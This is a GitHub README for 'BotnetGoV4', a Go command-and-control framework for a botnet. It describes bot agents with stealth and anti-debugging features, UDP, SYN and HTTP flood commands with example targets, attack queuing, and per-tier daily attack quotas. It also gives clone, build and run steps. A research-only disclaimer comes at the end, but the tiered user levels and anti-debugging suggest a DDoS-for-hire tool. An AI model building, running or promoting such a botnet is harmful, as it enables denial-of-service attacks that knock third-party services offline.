# GolangV4 
![Go Version](https://img.shields.io/badge/go-1.21+-blue.svg)
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
![Code Size](https://img.shields.io/github/languages/code-size/1Birdo/BotnetGoV4)
![Last Commit](https://img.shields.io/github/last-commit/1Birdo/BotnetGoV4)

A high-performance Command and Control (C2) framework written in Go, designed for security research and network testing with enterprise-grade security features, multi-user management, and attack orchestration capabilities.

## 📌 Key Features

### 🔐 Security & Authentication
- **TLS 1.3 Encryption** with mutual certificate authentication
- **Role-Based Access Control** (Owner/Admin/Pro/Basic)
- **Two-Factor Authentication** (TOTP supported)
- **IP-based rate limiting** and connection throttling
- **Secure credential storage** with bcrypt hashing

### ⚡ Attack Management
- **8+ Attack Vectors** including UDP/TCP/SYN floods
- **Intelligent Attack Queuing** with priority system
- **Real-time Attack Monitoring** with duration control
- **Daily Attack Quotas** per user level

### 🤖 Bot Network
- **Persistent Connections** with auto-reconnect
- **Bot Performance Metrics** (latency, throughput)
- **Cross-platform Agents** (architecture detection)
- **Stealth Mode** with anti-debugging techniques

### 📊 Monitoring & Analytics
- **Live Bot Statistics Dashboard**
- **Comprehensive Audit Logging**
- **Automatic Log Rotation**
- **Session Activity Tracking**

## 🚀 Quick Start

### Prerequisites
- Go 1.21+ installed
- OpenSSL for certificate management
- Linux/Unix environment recommended

### Installation
```bash
git clone https://github.com/1Birdo/BotnetGoV4.git
cd BotnetGoV4
go build -o c2 main.go
```

### Certificate Setup
```bash
# Generate CA and server certificates
./generate_certs.sh
```

### Running the Server
```bash
./c2
```

### 🖥️ Client Connection
```bash
openssl s_client -connect [SERVER_IP]:[PORT] \
  -cert client.crt -key client.key -CAfile ca.crt
```

## 📋 Command Reference

### User Management
| Command  | Description          | Access Level |
|----------|----------------------|---------------|
| adduser  | Create new user      | Owner/Admin   |
| deluser  | Remove user          | Owner/Admin   |
| resetpw  | Reset user password  | Owner/Admin   |
| db       | View user database   | Owner/Admin   |

### Attack Commands
| Command     | Description        | Example Usage                  |
|-------------|--------------------|--------------------------------|
| !udpflood   | Standard UDP flood | !udpflood 1.1.1.1 80 60        |
| !synflood   | SYN packet flood   | !synflood 1.1.1.1 443 30       |
| !http       | HTTP layer 7 flood | !http example.com 80 120       |
| queue       | View queued attacks| queue                          |
| cancel      | Cancel queued attack| cancel 2                       |

### Monitoring
| Command | Description                |
|---------|----------------------------|
| bots    | Show connected bot count   |
| ongoing | View active attacks        |
| stats   | Detailed bot performance   |
| logs    | View audit logs (Admin+)   |

## 🛠️ Technical Architecture
```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   C2 Server     │    │   Bot Clients   │    │   Target Host   │
│                 │    │                 │    │                 │
│  - User Auth    │◄──►│  - Auto-Connect │    │                 │
│  - Attack Queue │    │  - Attack Exec  │───►│  - Under Attack │
│  - Logging      │    │  - Stats Report │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 🔒 Security Implementation
- **Certificate Pinning**: Prevents MITM attacks
- **Input Sanitization**: All user inputs are validated
- **Session Timeouts**: Default 30 minute inactivity timeout
- **IP Blacklisting**: Automatic blocking of suspicious IPs
- **Encrypted Communications**: All traffic uses TLS 1.3

## 📜 License
GNU General Public License v3.0 - See LICENSE for details.

## ⚠️ Legal Disclaimer
This software is intended for:
- Authorized penetration testing
- Security research
- Educational purposes

The developers assume no responsibility for unauthorized or illegal use.
All users must comply with applicable laws and regulations.

---

⭐ Star the repository if you find this project useful!  
💬 Contributions and issues are welcome!
